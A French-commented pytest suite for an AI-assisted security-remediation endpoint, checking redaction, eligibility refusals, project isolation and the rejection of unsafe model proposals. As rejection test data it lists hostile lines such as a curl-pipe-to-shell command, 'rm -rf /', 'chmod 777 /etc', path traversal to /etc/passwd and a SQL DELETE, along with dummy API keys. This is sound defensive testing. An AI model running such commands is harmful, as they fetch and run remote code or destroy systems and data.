"""Tests de la remediation assistee, cote backend (phase 7).

Le fournisseur d'IA est simule par l'enregistreur de `test_security_ai`,
qui conserve le corps de chaque requete : plusieurs garanties portent sur
ce qui SORT du backend.

Ce que ces tests verrouillent :

    RIEN N'EST ECRIT   la route decrit une modification ; elle n'ecrit ni
                       fichier ni finding. Verifie sur la base (ligne du
                       finding identique) et sur le code source (aucune
                       ecriture disque, aucune ecriture de finding).
    ELIGIBILITE        fichiers proteges, verrous, finding referme, fichier
                       ou ligne incoherents : refus AVANT tout appel au
                       modele — rien n'est transmis.
    EXPURGATION        l'extrait est reexpurge ligne a ligne, indentation
                       conservee ; ni cle API ni secret dans le prompt.
    STRICTE            un champ interdit (gravite, statut, commande, SQL),
                       un type ambigu, une reponse illisible : 502.
    SURE               plage bornee contenant la ligne du finding, aucune
                       valeur masquee recopiee, aucun secret ecrit, aucune
                       construction dangereuse introduite.
    CLOISONNEMENT      un finding d'un autre projet est introuvable, pour
                       les deux familles (securite projet, analyse de code).
"""

import ast
import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app import store
from app.ai import security_fix
from app.ai.security_fix_schemas import AiFixSuggestion, SecurityFixRequest
from app.code.schemas import content_hash_of
from app.config import settings
from app.main import app
from tests.conftest import auth_headers
from tests.test_security_ai import (  # noqa: F401 - fixtures importees
    _code_sans_documentation,
    ai_configured,
    provider,
    register,
    secret,
    submit_index,
    submit_secrets,
)

# --------------------------------------------------------------------------
# Fabriques
# --------------------------------------------------------------------------

SECRET_LINE = '    OPENAI_KEY = "sk-proj-abcdefghijklmnopqrstuvwxyz0123456789"'

FILE_LINES = [
    "import os",
    "",
    "",
    "class Settings:",
    '    """Configuration."""',
    "",
    SECRET_LINE,
    '    MODEL = "gpt-4o-mini"',
    "",
]
# Le secret est a la ligne 7 du fichier.
SECRET_LINE_NUMBER = 7

VALID_FIX = {
    "feasible": True,
    "explanation": "La clé est lue depuis l'environnement au lieu d'être écrite en dur.",
    "reason": "Aucune valeur secrète ne reste dans le code source.",
    "start_line": SECRET_LINE_NUMBER,
    "end_line": SECRET_LINE_NUMBER,
    "replacement_lines": ['    OPENAI_KEY = os.environ["OPENAI_API_KEY"]'],
    "warnings": ["Définissez OPENAI_API_KEY dans l'environnement de déploiement."],
    "manual_steps": [],
}


@pytest.fixture
def client():
    with TestClient(app) as test_client:
        yield test_client


def fix_request(**overrides) -> dict:
    payload = {
        "file_path": "backend/config.py",
        "content_hash": "a" * 64,
        "language": "python",
        "target_line": SECRET_LINE_NUMBER,
        "excerpt_start_line": 1,
        "excerpt_lines": list(FILE_LINES),
    }
    payload.update(overrides)
    return payload


def project_with_secret(client: TestClient, name: str = "projet-fix", **secret_overrides):
    """Projet indexe avec un secret en ligne 7. Retourne (uid, finding_id)."""
    uid = register(client, name)
    submit_index(client, uid)
    fields = {"line": SECRET_LINE_NUMBER}
    fields.update(secret_overrides)
    findings = submit_secrets(client, uid, [secret(**fields)])
    return uid, findings[0]["id"]


def ask_fix(client: TestClient, uid: str, finding_id: str, **overrides):
    return client.post(
        f"/api/project/{uid}/findings/{finding_id}/ai-fix",
        json=fix_request(**overrides),
        headers=auth_headers(),
    )


# --------------------------------------------------------------------------
# Proposition
# --------------------------------------------------------------------------


def test_un_correctif_borne_est_propose_pour_un_secret(client, provider):
    recorder = provider([VALID_FIX])
    uid, finding_id = project_with_secret(client)

    response = ask_fix(client, uid, finding_id)

    assert response.status_code == 200, response.text
    body = response.json()
    assert recorder.calls == 1
    assert body["available"] is True
    assert body["kind"] == "security"
    assert body["ai_generated"] is True
    assert "confirmation" in body["disclaimer"]
    assert body["file"] == "backend/config.py"
    assert (body["start_line"], body["end_line"]) == (7, 7)
    assert body["replacement_lines"] == ['    OPENAI_KEY = os.environ["OPENAI_API_KEY"]']
    # L'empreinte recue est renvoyee : c'est contre elle que l'extension
    # verifiera le fichier avant d'ecrire.
    assert body["base_content_hash"] == "a" * 64
    # La gravite est recopiee du moteur.
    assert body["deterministic_severity"] == "MEDIUM"
    assert body["warnings"]
    # La revocation n'est jamais remplacee par un correctif de code.
    assert any("révoquez" in step for step in body["manual_steps"])


def test_la_proposition_ne_porte_ni_gravite_ni_statut(client, provider):
    provider([VALID_FIX])
    uid, finding_id = project_with_secret(client, "projet-sans-decision")

    body = ask_fix(client, uid, finding_id).json()

    for champ in ("severity", "risk_score", "status", "fixed"):
        assert champ not in body


def test_la_proposition_ne_modifie_ni_le_finding_ni_sa_gravite(client, provider):
    provider([VALID_FIX])
    uid, finding_id = project_with_secret(client, "projet-intact")
    avant = store.get_security_finding(finding_id)
    findings_avant = store.list_security_findings(uid)

    assert ask_fix(client, uid, finding_id).status_code == 200

    assert store.get_security_finding(finding_id) == avant
    assert store.list_security_findings(uid) == findings_avant


def test_un_modele_qui_dit_impossible_donne_une_remediation_manuelle(client, provider):
    provider(
        [
            {
                "feasible": False,
                "explanation": "La correction demande de restructurer la classe.",
                "reason": "",
                "manual_steps": ["Déplacer la configuration dans un module dédié"],
            }
        ]
    )
    uid, finding_id = project_with_secret(client, "projet-infaisable")

    body = ask_fix(client, uid, finding_id).json()

    assert body["available"] is False
    assert "manuelle" in body["refusal"]
    assert body["replacement_lines"] == []
    assert "Déplacer la configuration dans un module dédié" in body["manual_steps"]


# --------------------------------------------------------------------------
# Ce qui part vers le modele
# --------------------------------------------------------------------------


def test_le_contexte_porte_l_extrait_numerote_et_le_signalement(client, provider):
    recorder = provider([VALID_FIX])
    uid, finding_id = project_with_secret(client, "projet-contexte")

    ask_fix(client, uid, finding_id)
    contexte = recorder.context()

    assert contexte["target_line"] == SECRET_LINE_NUMBER
    assert contexte["max_range_lines"] == settings.security_ai_fix_max_range_lines
    assert [item["line"] for item in contexte["excerpt"]] == list(range(1, 10))
    # L'indentation est conservee : sans elle, le modele en invente une.
    assert contexte["excerpt"][3]["text"] == "class Settings:"
    assert contexte["excerpt"][7]["text"].startswith("    MODEL")
    assert contexte["finding"]["category"] == "SECRET"
    assert contexte["finding"]["file"] == "backend/config.py"
    assert contexte["project"]["project_name"] == "projet-contexte"


def test_l_extrait_est_reexpurge_avant_l_envoi(client, provider):
    """L'extension expurge deja ; le backend ne lui fait pas confiance."""
    recorder = provider([VALID_FIX])
    uid, finding_id = project_with_secret(client, "projet-reexpurge")

    lines = list(FILE_LINES)
    lines[1] = "AWS = 'AKIAIOSFODNN7EXAMPLE'"
    ask_fix(client, uid, finding_id, excerpt_lines=lines)
    corps = recorder.raw()

    assert "sk-proj-abcdefghijklmnopqrstuvwxyz0123456789" not in corps
    assert "AKIAIOSFODNN7EXAMPLE" not in corps
    masquee = recorder.context()["excerpt"][6]["text"]
    assert "********" in masquee or "[REDACTED]" in masquee
    assert masquee.startswith("    OPENAI_KEY")


def test_aucune_information_d_identification_ni_identifiant_interne_n_est_transmis(
    client, provider
):
    recorder = provider([VALID_FIX])
    uid, finding_id = project_with_secret(client, "projet-identifiants")

    ask_fix(client, uid, finding_id)
    corps = recorder.raw()

    assert settings.openai_api_key not in corps
    assert uid not in corps
    assert finding_id not in corps
    # L'empreinte du fichier ne sert qu'a l'extension.
    assert "a" * 64 not in corps


# --------------------------------------------------------------------------
# Eligibilite : refus deterministes, sans appel au modele
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "chemin",
    [".env", ".env.production", "config/id_rsa", "certs/server.pem",
     "tls/server.key", "certs/site.crt", "keys/store.p12", "credentials"],
)
def test_un_fichier_protege_n_est_jamais_modifie(client, provider, chemin):
    recorder = provider([VALID_FIX])
    uid = register(client, f"projet-protege-{chemin}")
    findings = submit_secrets(
        client, uid, [secret(file_path=chemin, line=SECRET_LINE_NUMBER)]
    )

    body = ask_fix(client, uid, findings[0]["id"], file_path=chemin).json()

    assert body["available"] is False
    assert "manuelle" in body["refusal"]
    assert body["replacement_lines"] == []
    # Rien n'est parti vers le modele.
    assert recorder.calls == 0


def test_un_modele_d_environnement_reste_eligible():
    """`.env.example` ne porte aucune valeur : c'est un modele de fichier."""
    assert security_fix.protection_reason(".env.example") is None
    assert security_fix.protection_reason("src/config.py") is None
    assert security_fix.protection_reason(".env") is not None


def test_un_finding_referme_ne_recoit_pas_de_correctif(client, provider):
    recorder = provider([VALID_FIX])
    uid, finding_id = project_with_secret(client, "projet-referme")
    with store.get_connection() as connection:
        connection.execute(
            "UPDATE security_findings SET status = 'dismissed' WHERE finding_id = ?",
            (finding_id,),
        )

    body = ask_fix(client, uid, finding_id).json()

    assert body["available"] is False
    assert recorder.calls == 0


def test_un_autre_fichier_que_celui_du_finding_est_refuse(client, provider):
    """Le correctif est borne au fichier du finding."""
    recorder = provider([VALID_FIX])
    uid, finding_id = project_with_secret(client, "projet-autre-fichier")

    body = ask_fix(client, uid, finding_id, file_path="backend/other.py").json()

    assert body["available"] is False
    assert recorder.calls == 0


def test_une_ligne_qui_ne_correspond_plus_au_finding_est_refusee(client, provider):
    """Le fichier a bouge depuis le balayage : relancer l'analyse d'abord."""
    recorder = provider([VALID_FIX])
    uid, finding_id = project_with_secret(client, "projet-derive")

    body = ask_fix(client, uid, finding_id, target_line=8).json()

    assert body["available"] is False
    assert "relancez l'analyse" in body["refusal"]
    assert recorder.calls == 0


# --------------------------------------------------------------------------
# Dependances
# --------------------------------------------------------------------------


def _dependency_finding(uid: str, manifest: str) -> str:
    """Insere un finding de dependance comme le moteur l'aurait ecrit."""
    store.sync_security_findings(
        uid,
        "DEPENDENCY",
        [
            {
                "finding_id": f"dep-{uid[:8]}-{manifest}",
                "fingerprint": f"fp-{manifest}",
                "severity": "HIGH",
                "confidence": "HIGH",
                "title": "express 4.17.1 — GHSA-29mw-wpgm-hmr9",
                "description": "Vulnérable.",
                "file_path": manifest,
                "line_start": 0,
                "line_end": 0,
                "evidence": "npm · express@4.17.1",
                "remediation": "Mettez à jour vers 4.19.2.",
                "reference_links": json.dumps(["GHSA-29mw-wpgm-hmr9"]),
                "detection_engine": "osv",
            }
        ],
    )
    return f"dep-{uid[:8]}-{manifest}"


MANIFEST = ["{", '  "dependencies": {', '    "express": "4.17.1"', "  }", "}"]


def test_une_dependance_est_corrigee_dans_son_manifeste(client, provider):
    recorder = provider(
        [
            {
                "feasible": True,
                "explanation": "Mise à jour vers la version corrigée.",
                "reason": "La version 4.19.2 corrige l'avis.",
                "start_line": 3,
                "end_line": 3,
                "replacement_lines": ['    "express": "4.19.2"'],
                "warnings": [],
                "manual_steps": [],
            }
        ]
    )
    uid = register(client, "projet-dependance")
    finding_id = _dependency_finding(uid, "package.json")

    body = ask_fix(
        client, uid, finding_id,
        file_path="package.json", language="json",
        target_line=3, excerpt_start_line=1, excerpt_lines=MANIFEST,
    ).json()

    assert body["available"] is True, body
    assert body["replacement_lines"] == ['    "express": "4.19.2"']
    assert any("verrouillage" in step for step in body["manual_steps"])
    assert recorder.calls == 1


def test_une_ligne_qui_ne_declare_pas_la_dependance_est_refusee(client, provider):
    recorder = provider([VALID_FIX])
    uid = register(client, "projet-dependance-ailleurs")
    finding_id = _dependency_finding(uid, "package.json")

    body = ask_fix(
        client, uid, finding_id,
        file_path="package.json", target_line=2,
        excerpt_start_line=1, excerpt_lines=MANIFEST,
    ).json()

    assert body["available"] is False
    assert recorder.calls == 0


def test_un_fichier_de_verrouillage_n_est_jamais_modifie(client, provider):
    recorder = provider([VALID_FIX])
    uid = register(client, "projet-verrou")
    finding_id = _dependency_finding(uid, "package-lock.json")

    body = ask_fix(
        client, uid, finding_id,
        file_path="package-lock.json", target_line=3,
        excerpt_start_line=1, excerpt_lines=MANIFEST,
    ).json()

    assert body["available"] is False
    assert "verrou" in body["refusal"]
    assert recorder.calls == 0


# --------------------------------------------------------------------------
# Findings d'analyse de code
# --------------------------------------------------------------------------

TLS_CODE = "import requests\n\nresponse = requests.get(url, verify=False)\n"


def _code_finding(client: TestClient, uid: str) -> str:
    response = client.post(
        "/api/code/scan",
        json={
            "file_path": "src/client.py",
            "language": "python",
            "content": TLS_CODE,
            "content_hash": content_hash_of(TLS_CODE),
            "workspace": "demo",
            "project_uid": uid,
        },
        headers=auth_headers(),
    )
    assert response.status_code == 200, response.text
    findings = response.json()["findings"]
    assert findings, "la regle TLS doit produire un finding"
    return findings[0]["finding_uid"]


def test_un_finding_de_code_recoit_un_correctif_borne(client, provider):
    recorder = provider(
        [
            {
                "feasible": True,
                "explanation": "La vérification TLS est réactivée.",
                "reason": "Le certificat du serveur est de nouveau contrôlé.",
                "start_line": 3,
                "end_line": 3,
                "replacement_lines": ["response = requests.get(url, verify=True)"],
                "warnings": [],
                "manual_steps": [],
            }
        ]
    )
    uid = register(client, "projet-code")
    finding_uid = _code_finding(client, uid)

    body = ask_fix(
        client, uid, finding_uid,
        file_path="src/client.py", target_line=3,
        excerpt_start_line=1, excerpt_lines=TLS_CODE.splitlines(),
    ).json()

    assert body["available"] is True, body
    assert body["kind"] == "code"
    assert recorder.calls == 1
    # Le finding de code n'a pas bouge.
    assert store.get_code_finding(finding_uid)["status"] == "open"


def test_un_finding_de_code_d_un_autre_projet_est_introuvable(client, provider):
    provider([VALID_FIX])
    premier = register(client, "projet-code-a")
    second = register(client, "projet-code-b")
    finding_uid = _code_finding(client, premier)

    response = ask_fix(
        client, second, finding_uid,
        file_path="src/client.py", target_line=3,
        excerpt_start_line=1, excerpt_lines=TLS_CODE.splitlines(),
    )

    assert response.status_code == 404


def test_un_finding_de_securite_d_un_autre_projet_est_introuvable(client, provider):
    recorder = provider([VALID_FIX])
    _, finding_id = project_with_secret(client, "projet-isole-a")
    autre = register(client, "projet-isole-b")

    assert ask_fix(client, autre, finding_id).status_code == 404
    assert recorder.calls == 0


def test_un_projet_inconnu_repond_404(client, provider):
    provider([VALID_FIX])
    assert ask_fix(client, "inconnu", "x").status_code == 404


def test_la_route_exige_le_jeton(client):
    uid = register(client, "projet-jeton-fix")
    response = TestClient(app).post(
        f"/api/project/{uid}/findings/x/ai-fix", json=fix_request()
    )
    assert response.status_code == 401


# --------------------------------------------------------------------------
# Indisponibilite
# --------------------------------------------------------------------------


def test_sans_cle_la_route_repond_503(client, monkeypatch):
    monkeypatch.setattr(settings, "openai_api_key", "")
    uid, finding_id = project_with_secret(client, "projet-fix-sans-ia")

    response = ask_fix(client, uid, finding_id)

    assert response.status_code == 503
    assert "OPENAI_API_KEY" in response.text


def test_remediation_desactivee_repond_503_et_l_etat_le_dit(client, monkeypatch):
    monkeypatch.setattr(settings, "security_ai_fix_enabled", False)
    uid, finding_id = project_with_secret(client, "projet-fix-off")

    response = ask_fix(client, uid, finding_id)
    assert response.status_code == 503
    assert "SECURITY_AI_FIX_ENABLED" in response.text

    health = client.get("/api/security/ai/health", headers=auth_headers()).json()
    assert health["available"] is True
    assert health["fix_available"] is False


def test_l_etat_annonce_la_remediation(client):
    health = client.get("/api/security/ai/health", headers=auth_headers()).json()
    assert health["fix_available"] is True


# --------------------------------------------------------------------------
# Reponses malformees ou interdites
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "reponse",
    [
        "pas du JSON",
        '["une", "liste"]',
        {"feasible": True},  # explication manquante
        {**VALID_FIX, "feasible": "true"},  # booleen ambigu
        {**VALID_FIX, "feasible": 1},
        {**VALID_FIX, "replacement_lines": "une seule chaine"},
        {**VALID_FIX, "start_line": "7"},
        {**VALID_FIX, "explanation": "   "},
        {**VALID_FIX, "note": "champ inconnu"},
    ],
)
def test_une_reponse_malformee_est_rejetee(client, provider, reponse):
    provider([reponse])
    uid, finding_id = project_with_secret(client, f"projet-malforme-{abs(hash(str(reponse)))}")

    response = ask_fix(client, uid, finding_id)

    assert response.status_code == 502


@pytest.mark.parametrize(
    "champ, valeur",
    [
        ("severity", "LOW"),
        ("status", "fixed"),
        ("risk_score", 0),
        ("delete_finding", True),
        ("sql", "DELETE FROM security_findings"),
        ("command", "rm -rf /"),
        ("file_path", "../../etc/passwd"),
    ],
)
def test_un_champ_interdit_fait_rejeter_toute_la_reponse(client, provider, champ, valeur):
    provider([{**VALID_FIX, champ: valeur}])
    uid, finding_id = project_with_secret(client, f"projet-interdit-{champ}")
    avant = store.get_security_finding(finding_id)

    response = ask_fix(client, uid, finding_id)

    assert response.status_code == 502
    assert champ in response.text
    assert store.get_security_finding(finding_id) == avant


# --------------------------------------------------------------------------
# Reponses dangereuses ou ambigues
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "surcharge, motif",
    [
        ({"start_line": None, "end_line": None}, "plage"),
        ({"start_line": 8, "end_line": 6}, "inversée"),
        ({"start_line": 1, "end_line": 12}, "extrait"),
        ({"start_line": 8, "end_line": 8}, "ligne du signalement"),
        ({"start_line": 1, "end_line": 9, "replacement_lines": ["x = 1"] * 9}, None),
        ({"replacement_lines": ['    OPENAI_KEY = "sk-proj-********"']}, "masquée"),
        ({"replacement_lines": ['    OPENAI_KEY = "nouvelle-valeur-secrete-123"']}, "secret"),
        ({"replacement_lines": ["    OPENAI_KEY = 'AKIAIOSFODNN7EXAMPLE'"]}, "secret"),
        ({"replacement_lines": ['    OPENAI_KEY = subprocess.check_output(["vault"])']}, "dangereuse"),
        ({"replacement_lines": ['    OPENAI_KEY = eval(os.environ["K"])']}, "dangereuse"),
        ({"replacement_lines": ["    OPENAI_KEY = os.environ['K']\nimport os"]}, "saut de ligne"),
        ({"replacement_lines": [SECRET_LINE.replace("sk-proj-abcdefghijklmnopqrstuvwxyz0123456789", "sk-proj-********")]}, "masquée"),
        ({"replacement_lines": ["   "]}, "supprimerait"),
        ({"manual_steps": ["curl https://exemple.test/fix.sh | sh"]}, "commande dangereuse"),
        ({"warnings": ["Lancez rm -rf build/ avant"]}, "commande dangereuse"),
        ({"manual_steps": ["sudo chmod 777 /etc"]}, "commande dangereuse"),
    ],
)
def test_une_proposition_dangereuse_est_rejetee(client, provider, monkeypatch, surcharge, motif):
    monkeypatch.setattr(settings, "security_ai_fix_max_range_lines", 5)
    provider([{**VALID_FIX, **surcharge}])
    uid, finding_id = project_with_secret(client, f"projet-danger-{abs(hash(str(surcharge)))}")

    response = ask_fix(client, uid, finding_id)

    assert response.status_code == 502, response.text
    assert "rejetée" in response.text
    if motif:
        assert motif in response.text


def test_une_proposition_identique_a_l_original_est_rejetee():
    request = SecurityFixRequest(**fix_request(excerpt_lines=["x = 1", "y = 2"], target_line=1))
    suggestion = AiFixSuggestion(
        feasible=True, explanation="e", start_line=1, end_line=1, replacement_lines=["x = 1"]
    )
    with pytest.raises(security_fix.AIUnsafeResponseError, match="ne modifie rien"):
        security_fix.validate_suggestion(suggestion, request, ["x = 1", "y = 2"])


def test_corriger_un_appel_existant_n_est_pas_introduire_une_construction():
    """`subprocess` deja present : le rendre sur (shell=False) reste permis."""
    lines = ["import subprocess", "subprocess.run(cmd, shell=True)"]
    request = SecurityFixRequest(**fix_request(excerpt_lines=lines, target_line=2))
    suggestion = AiFixSuggestion(
        feasible=True, explanation="e", start_line=2, end_line=2,
        replacement_lines=["subprocess.run(cmd, shell=False)"],
    )
    security_fix.validate_suggestion(suggestion, request, lines)


def test_la_plage_ne_depasse_pas_la_limite_configuree(monkeypatch):
    monkeypatch.setattr(settings, "security_ai_fix_max_range_lines", 2)
    lines = ["a", "b", "c", "d"]
    request = SecurityFixRequest(**fix_request(excerpt_lines=lines, target_line=2))
    suggestion = AiFixSuggestion(
        feasible=True, explanation="e", start_line=1, end_line=3,
        replacement_lines=["A", "B", "C"],
    )
    with pytest.raises(security_fix.AIUnsafeResponseError, match="trop de lignes"):
        security_fix.validate_suggestion(suggestion, request, lines)


# --------------------------------------------------------------------------
# Validation de la requete
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "surcharge",
    [
        {"target_line": 40},  # hors extrait
        {"excerpt_lines": ["a\nb"]},
        {"excerpt_lines": ["x"] * 100},
        {"excerpt_lines": []},
        {"file_path": "/etc/passwd"},
        {"file_path": "../secret.py"},
        {"content_hash": "court"},
        {"excerpt_lines": ["x" * 900], "target_line": 1},
    ],
)
def test_une_requete_hors_bornes_est_refusee(client, provider, surcharge):
    recorder = provider([VALID_FIX])
    uid, finding_id = project_with_secret(client, f"projet-requete-{abs(hash(str(surcharge)))}")

    response = ask_fix(client, uid, finding_id, **surcharge)

    assert response.status_code == 422
    assert recorder.calls == 0


# --------------------------------------------------------------------------
# Relecture du code source
# --------------------------------------------------------------------------


def test_la_remediation_backend_n_ecrit_ni_fichier_ni_finding():
    """Aucune ecriture disque, aucune ecriture de finding, dans aucun chemin."""
    racine = Path(__file__).resolve().parent.parent / "app"
    interdits = (
        "sync_security_findings",
        "delete_security_findings",
        "update_code_finding_fields",
        "UPDATE security_findings",
        "INSERT INTO security_findings",
        "DELETE FROM security_findings",
        "UPDATE code_findings",
        "write_text",
        "write_bytes",
        "remove",
        "unlink",
        "rmtree",
        "rename",
        "replace_file",
    )
    for fichier in (
        racine / "ai" / "security_fix.py",
        racine / "ai" / "security_fix_schemas.py",
    ):
        source = fichier.read_text(encoding="utf-8")
        code = _code_sans_documentation(source)
        for interdit in interdits:
            assert interdit not in code, f"{fichier.name} contient « {interdit} »"

        # Aucune ouverture de fichier, en lecture comme en ecriture. Verifie
        # sur les APPELS : la chaine "open" est aussi un statut de finding.
        for noeud in ast.walk(ast.parse(source)):
            if isinstance(noeud, ast.Call):
                nom = getattr(noeud.func, "id", None) or getattr(noeud.func, "attr", None)
                assert nom not in {"open", "write", "writelines", "mkdir", "touch"}, (
                    f"{fichier.name} appelle « {nom} »"
                )


def test_les_motifs_a_forte_signature_sont_actifs():
    """Regression : ces motifs portaient un caractere de controle (0x08).

    Un `\b` ecrit hors d'une chaine brute etait devenu un retour arriere :
    aucun motif ne correspondait, et la detection d'un secret dans un
    correctif reposait sur la seule passe generique.
    """
    from app.security.redaction import _HIGH_SIGNAL, contains_secret_literal

    for pattern in _HIGH_SIGNAL:
        assert chr(8) not in pattern.pattern
    assert _HIGH_SIGNAL[0].search("cle AKIAIOSFODNN7EXAMPLE ici")
    assert _HIGH_SIGNAL[1].search("token ghp_abcdefghijklmnopqrstuvwxyz0123")
    assert contains_secret_literal("x = 'AKIAIOSFODNN7EXAMPLE'")
